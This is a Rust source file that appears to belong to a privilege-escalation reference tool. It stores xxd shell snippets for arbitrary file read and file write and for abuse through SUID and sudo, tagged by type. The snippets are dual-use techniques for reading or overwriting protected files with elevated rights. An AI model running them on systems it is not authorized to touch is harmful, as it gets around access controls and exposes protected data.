pub static BIN_NAME: &'static str = "xxd";
pub static FW_CODE: &'static str = r#"
    
    LFILE=file_to_write
    echo DATA | xxd | xxd -r - "$LFILE"
"#;
pub static FR_CODE: &'static str = r#"
    
    LFILE=file_to_read
    xxd "$LFILE" | xxd -r
"#;
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which xxd) .

    LFILE=file_to_read
    ./xxd "$LFILE" | xxd -r
"#;
pub static SUDO_CODE: &'static str = r#"
    
    LFILE=file_to_read
    sudo xxd "$LFILE" | xxd -r
"#;
use crate::code::{Code, Tag};
pub static FW: Code<'static> = Code { 
	title: "FW_CODE",
	code: FW_CODE,
	tag: Tag::FW,
};
pub static FR: Code<'static> = Code { 
	title: "FR_CODE",
	code: FR_CODE,
	tag: Tag::FR,
};
pub static SUID: Code<'static> = Code { 
	title: "SUID_CODE",
	code: SUID_CODE,
	tag: Tag::SUID,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
